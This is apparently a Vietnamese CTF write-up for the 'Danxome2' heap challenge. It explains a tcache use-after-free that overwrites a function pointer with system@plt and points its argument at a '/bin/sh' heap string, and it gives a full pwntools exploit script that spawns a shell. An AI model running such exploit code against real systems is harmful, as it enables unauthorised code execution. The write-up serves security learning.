# Danxome2
## Ý tưởng
- Bài này tương tự như Danxome cũng có lỗ hổng ở chỗ không xoá con trỏ sau khi free và UAF
- Chương trình khá ổn khi 1 lần tạo 2 chunk (chunk lưu speak, chunk lưu tên) đều 0x20 byte và khi free thì chunk tên free trước, chunk speak free sau.
- Tuy nhiên để ow được chunk speak, ta tận dụng cơ chế tcache là mỗi size lưu được 7 chunk.
- Lỗ hổng như sau:
    - Ta sẽ tạo 4 minon (8 chunk) và free 4 minon, thứ tự trong tcache (số đen)
    ![image](https://github.com/wan-hyhty/trainning/assets/111769169/9abba3bd-e9eb-4c31-94da-d638862becdb)
    - Khi free xong chunk 8 sẽ được lưu trong fastbin do tcache đầy
    - Khi malloc 1 minon mới, chương trình sẽ lấy trong tcache trước và lấy chunk 7 (lưu speak) và chunk 6 (lưu ten)
    > Vây là ta đã có thể UAF, ow chunk 6 là system
## Khai thác 
- Dựa trên lí thuyết trên ta tạo 5 minon như sau
```python
add(b'a'*0x18)
add(b'b'*0x18)
add(b'c'*0x18)
add(b'd'*0x18)
add(b'/bin/sh\x00')
```
- Ta free 4 minon đầu, và tạo minon mới
```python
remove(0)
remove(1)
remove(2)
remove(3)

add(flat(system_plt, 0)+b'\xc0')
```
- Minon mới sẽ ghi đè như hình ở phần ý tưởng, tại sao lại có `b'\xc0`. Vì khi `report_name`, nó sẽ call rdxx là `system`, tuy nhiên rdi cần là một địa chỉ chứa chuỗi `/bin/sh` nhưng trong chương trình không có sẵn, vì vậy ở phần tạo 4 minon đầu, ta sẽ tạo minon 4 tên `/bin/sh` và khi UAF, ta sẽ ow địa chỉ heap thành địa chỉ heap chứa `/bin/sh` của minon 4

```python
from pwn import *

context.binary = elf = ELF('./minon')
# p = remote('pwn.battlectf.online',1007)
p = process("./minon")
system_plt = elf.plt['system']

gdb.attach(p, gdbscript = '''
           b*0x0000000000401450
           b*0x000000000040167a
           c
           
           ''')
input()
def add(name):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'>', b'1')
    p.sendafter(b'>', name)
    p.recvuntil(b'> [DEBUG]')

def remove(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'>', str(idx).encode('utf-8'))
    p.recvuntil(b'> [DEBUG]')

def report(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>', str(idx).encode('utf-8'))

add(b'a'*0x18)
add(b'b'*0x18)
add(b'c'*0x18)
add(b'd'*0x18)
add(b'/bin/sh\x00')

remove(0)
remove(1)
remove(2)
remove(3)

add(flat(system_plt, 0)+b'\xc0')

report(2)

p.interactive()
```